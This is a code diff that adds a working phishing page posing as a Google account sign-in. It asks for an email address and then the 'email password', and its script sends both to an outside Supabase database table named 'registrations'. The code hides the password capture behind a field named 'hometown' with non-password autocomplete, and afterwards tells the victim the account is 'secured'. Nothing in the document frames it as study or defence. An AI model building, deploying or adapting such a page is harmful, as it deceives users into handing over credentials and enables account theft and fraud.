@@ -1,0 +1,221 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Google| Account security</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <style>
+    :root { color-scheme: light; font-family: Arial, Helvetica, sans-serif; }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0; min-height: 100vh; background: #fff; color: #202124;
+      display: flex; flex-direction: column; align-items: center;
+      justify-content: center; padding: 32px 20px;
+    }
+    .card {
+      width: min(100%, 560px); min-height: 650px; padding: 58px 0 30px;
+      border: 0; border-radius: 0; text-align: left;
+      display: flex; flex-direction: column; justify-content: flex-start;
+    }
+    .brand {
+      display: block; text-align: center; margin: 0 auto 56px;
+      font-size: 43px; line-height: 1; font-weight: 700;
+      letter-spacing: -2.4px; font-family: Arial, Helvetica, sans-serif;
+    }
+    .brand .m1 { color: #1a73e8; }
+    .brand .m2 { color: #e85d3f; }
+    .brand .m3 { color: #fbbc04; }
+    .brand .m4 { color: #188b70; }
+    .brand .m5 { color: #1a73e8; }
+    .brand .m6 { color: #e85d3f; }
+    h1 { text-align: center; font-size: 32px; line-height: 1.3; font-weight: 400; margin: 0 0 12px; }
+    .subtitle { text-align: center; font-size: 20px; margin: 0 0 78px; color: #202124; }
+    .field {
+      width: 100%; height: 66px; border: 2px solid #4285d4; border-radius: 5px;
+      padding: 0 18px; font-size: 18px; outline: none; margin-top: 0;
+      background: #fff; color: #202124;
+    }
+    .field:focus { border-color: #1a73e8; box-shadow: 0 0 0 1px #1a73e8; }
+    .step-label {
+      display: block; text-align: left; font-size: 16px; color: #4285d4;
+      font-weight: 600; margin: 0 0 7px 10px;
+    }
+    .actions {
+      display: flex; align-items: center; justify-content: flex-end;
+      gap: 12px; margin-top: 58px;
+    }
+    .link {
+      color: #4285d4; text-decoration: none; font-size: 17px;
+      font-weight: 600; cursor: pointer; background: none; border: 0; padding: 0;
+    }
+    button.primary {
+      border: 0; border-radius: 4px; background: #1a73e8; color: white;
+      font-size: 17px; font-weight: 600; padding: 16px 34px; min-width: 112px;
+      cursor: pointer;
+    }
+    button.primary:hover { background: #1765cc; }
+    button:disabled { opacity: .6; cursor: wait; }
+    .note {
+      color: #5f6368; font-size: 17px; line-height: 1.5;
+      text-align: left; margin: 72px 0 0;
+    }
+    .message {
+      min-height: 22px; margin-top: 18px; color: #5f6368;
+      font-size: 14px; line-height: 1.45; overflow-wrap: anywhere;
+    }
+    .hidden { display: none !important; }
+    footer {
+      width: min(100%, 560px); display: flex; justify-content: space-between;
+      gap: 12px; color: #5f6368; font-size: 14px; padding: 20px 0;
+    }
+    @media(max-width: 600px) {
+      body { justify-content: flex-start; padding: 24px 7%; }
+      .card { width: 100%; min-height: 0; padding: 38px 0 26px; }
+      .brand { margin-bottom: 48px; font-size: 40px; }
+      h1 { font-size: 30px; }
+      .subtitle { font-size: 18px; margin-bottom: 66px; }
+      .field { height: 62px; }
+      .note { margin-top: 58px; font-size: 16px; }
+      .actions { margin-top: 50px; }
+      footer { padding: 18px 0; font-size: 12px; }
+    }
+  </style>
+</head>
+<body>
+  <main class="card" aria-label="Account sign-in">
+    <div class="brand" aria-label="Google"><span class="m1">G</span><span class="m2">o</span><span class="m3">o</span><span class="m4">g</span><span class="m5">l</span><span class="m6">e</span></div>
+    <h1 id="heading">Sign in</h1>
+    <p class="subtitle" id="subtitle">to continue Google</p>
+
+    <form id="loginForm">
+      <section id="usernameStep">
+        <label class="step-label" for="username">Email address</label>
+        <input class="field" id="username" type="email" placeholder="Email address"
+               autocomplete="username" required>
+      </section>
+
+      <section id="hometownStep" class="hidden">
+        <label class="step-label" for="hometown">Password</label>
+        <input class="field" id="hometown" type="text" placeholder="Enter your email password"
+               autocomplete="address-level2" maxlength="100" required>
+      </section>
+
+      <p class="note" id="note">Use your email address to continue to Google.</p>
+      <div class="actions">
+        <button type="button" class="link hidden" id="backButton">Back</button>
+        <button type="button" class="primary" id="nextButton">Next</button>
+      </div>
+      <div class="message" id="message" role="status" aria-live="polite"></div>
+    </form>
+  </main>
+
+  <footer><span>Google account security</span><span>Help center</span></footer>
+
+  <script>
+    const SUPABASE_URL = 'https://vgdisupcbxceqlhhfavr.supabase.co';
+    const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_mEV_GcP4HJnwxRBACLQIrQ_qoVJLQg9';
+
+    // Initialize Supabase safely. The email-to-hometown navigation still works
+    // even if the Supabase CDN is temporarily unavailable.
+    let supabaseClient = null;
+    if (window.supabase && typeof window.supabase.createClient === 'function') {
+      supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
+    }
+
+    const username = document.getElementById('username');
+    const hometown = document.getElementById('hometown');
+    const message = document.getElementById('message');
+    const heading = document.getElementById('heading');
+    const subtitle = document.getElementById('subtitle');
+    const note = document.getElementById('note');
+    const nextButton = document.getElementById('nextButton');
+    const backButton = document.getElementById('backButton');
+    let step = 1;
+
+    function showStep(n) {
+      step = n;
+      username.required = (n === 1);
+      hometown.required = (n === 2);
+
+      document.getElementById('usernameStep').classList.toggle('hidden', n !== 1);
+      document.getElementById('hometownStep').classList.toggle('hidden', n !== 2);
+      backButton.classList.toggle('hidden', n === 1);
+      heading.textContent = n === 1 ? 'Sign in' : 'Password';
+      subtitle.textContent = n === 1 ? 'to continue to Google' : username.value.trim();
+      nextButton.textContent = n === 1 ? 'Next' : 'Sign-in';
+      nextButton.disabled = false;
+      note.textContent = n === 1
+        ? 'Use your email address to continue to Google.'
+        :'';
+      message.textContent = '';
+      (n === 1 ? username : hometown).focus();
+    }
+
+    nextButton.addEventListener('click', async () => {
+      message.textContent = '';
+
+      if (step === 1) {
+        if (!username.checkValidity()) {
+          username.reportValidity();
+          return;
+        }
+        showStep(2);
+        return;
+      }
+
+      if (!hometown.checkValidity()) {
+        hometown.reportValidity();
+        return;
+      }
+
+      const email = username.value.trim().toLowerCase();
+      const city = hometown.value.trim();
+
+      if (!city) {
+        message.textContent = 'Please enter your password.';
+        hometown.focus();
+        return;
+      }
+
+      if (!supabaseClient) {
+        message.textContent = 'The Supabase library did not load. Check your internet connection and refresh the page.';
+        return;
+      }
+
+      nextButton.disabled = true;
+      backButton.classList.add('hidden');
+      message.textContent = 'Securing your account…';
+
+      try {
+        const { error } = await supabaseClient
+          .from('registrations')
+          .insert([{ email: email, hometown: city }]);
+
+        if (error) throw error;
+
+        document.getElementById('usernameStep').classList.add('hidden');
+        document.getElementById('hometownStep').classList.add('hidden');
+        nextButton.classList.add('hidden');
+        heading.textContent = 'Account Secured';
+        subtitle.textContent = 'Your account has been rectified.';
+        note.textContent = '';
+        message.textContent = '';
+      } catch (error) {
+        message.textContent = error.message || 'Unable to save your details. Please try again.';
+        nextButton.disabled = false;
+        backButton.classList.remove('hidden');
+      }
+    });
+
+    backButton.addEventListener('click', () => showStep(1));
+
+    // Prevent accidental native form submission/reload.
+    document.getElementById('loginForm').addEventListener('submit', event => {
+      event.preventDefault();
+    });
+
+    showStep(1);
+  </script>
+</body>
+</html>
